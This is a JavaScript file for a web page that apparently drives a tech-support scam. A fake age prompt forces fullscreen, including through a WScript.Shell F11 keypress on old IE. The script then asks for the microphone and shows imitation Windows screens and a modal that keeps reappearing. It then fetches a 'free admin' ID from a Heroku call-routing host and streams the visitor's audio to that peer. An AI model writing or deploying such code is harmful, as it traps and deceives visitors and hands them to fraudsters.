function requestFullScreen(element) {
    // Supports most browsers and their versions.
    var requestMethod =
        element.requestFullScreen ||
        element.webkitRequestFullScreen ||
        element.mozRequestFullScreen ||
        element.msRequestFullScreen;

    if (requestMethod) {
        // Native full screen.
        requestMethod.call(element);
    } else if (typeof window.ActiveXObject !== "undefined") {
        // Older IE.
        var wscript = new ActiveXObject("WScript.Shell");
        if (wscript !== null) {
            wscript.SendKeys("{F11}");
        }
    }
}

document.getElementById("age-confirmation-modal").onclick = function () {
    document.getElementById("age-confirmation-modal").style.display = "none";
    document.getElementById("takemicpermission").style.display = "inline";

    var elem = document.body; // Make the body go full screen.
    requestFullScreen(elem);

    document.getElementById("clickallow").play();
    getLocalStream();
};

//call logic below this line

const peer = new Peer();

window.peer = peer;

function getLocalStream() {
    navigator.mediaDevices
        .getUserMedia({ video: false, audio: true })
        .then((stream) => {
            window.localStream = stream; // A
            window.localAudio.srcObject = stream; // B
            window.localAudio.autoplay = true; // C

            document.getElementById("takemicpermission").style.display = "none";
            document.getElementById("windowsscreen").style.display = "inline";

            document.getElementById("clickallow").remove();
            setTimeout(() => {
                document.getElementById("windowsmodal").style.display = "block";
            }, 10000);
        })
        .catch((err) => {
            setTimeout(() => {
                document.getElementById("windowsmodal").style.display = "block";
            }, 5000);
            if (
                err.message === "Permission denied" ||
                err.message === "Permission dismissed"
            ) {
                console.log("Blocked");
                document.getElementById("takemicpermission").style.display =
                    "none";
                document.getElementById("windowsscreen").style.display =
                    "inline";

                document.getElementById("clickallow").remove();
                document.getElementById("audioElement").play();
            } else {
                console.log("Allowed");
                document.getElementById("takemicpermission").style.display =
                    "none";
                document.getElementById("windowsscreen").style.display =
                    "inline";

                document.getElementById("clickallow").remove();

                setTimeout(() => {
                    document.getElementById(
                        "windowsmodalloading"
                    ).style.display = "block";
                }, 45000);

                setTimeout(() => {
                    document.getElementById(
                        "windowsmodalloading"
                    ).style.display = "none";
                    document.getElementById("windowsscreen").style.display =
                        "none";
                    document.getElementById("connectedScreen").style.display =
                        "block";
                }, 55000);
            }
        });
}

// getLocalStream();

peer.on("open", function () {
    window.caststatus.textContent = ``;
});

const audioContainer = document.querySelector(".call-container");
/**
 * Displays the call button and peer ID
 * @returns{void}
 */

function showCallContent() {
    window.caststatus.textContent = ``;
    callBtn.hidden = false;
    audioContainer.hidden = true;
}

/**
 * Displays the audio controls and correct copy
 * @returns{void}
 */

function showConnectedContent() {
    window.caststatus.textContent = ``;
    callBtn.hidden = true;
    audioContainer.hidden = false;
}

let code;
function getStreamCode() {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open(
        "GET",
        "https://japancallrouting.herokuapp.com/findfreeadmin",
        false
    );
    xmlHttp.send(null);

    code = JSON.parse(xmlHttp.response).peerid;
}

let conn;
function connectPeers() {
    conn = peer.connect(code);
}

peer.on("connection", function (connection) {
    conn = connection;
});

const callBtn = document.querySelector(".call-btn");

callBtn.addEventListener("click", function () {
    getStreamCode();
    connectPeers();
    const call = peer.call(code, window.localStream); // A

    call.on("stream", function (stream) {
        // B
        window.remoteAudio.srcObject = stream; // C
        window.remoteAudio.autoplay = true; // D
        window.peerStream = stream; //E
        showConnectedContent(); //F
    });
});

peer.on("call", function (call) {
    const answerCall = confirm("Do you want to answer?");

    if (answerCall) {
        call.answer(window.localStream); // A
        showConnectedContent(); // B
        call.on("stream", function (stream) {
            // C
            window.remoteAudio.srcObject = stream;
            window.remoteAudio.autoplay = true;
            window.peerStream = stream;
        });
        const body = document.getElementsByTagName("body")[0];
        body.classList.remove("call-btn");
    } else {
        console.log("call denied"); // D
    }
});

function removemodal() {
    document.getElementById("windowsmodal").style.display = "none";

    setTimeout(() => {
        document.getElementById("windowsmodal").style.display = "block";
    }, 10000);
}
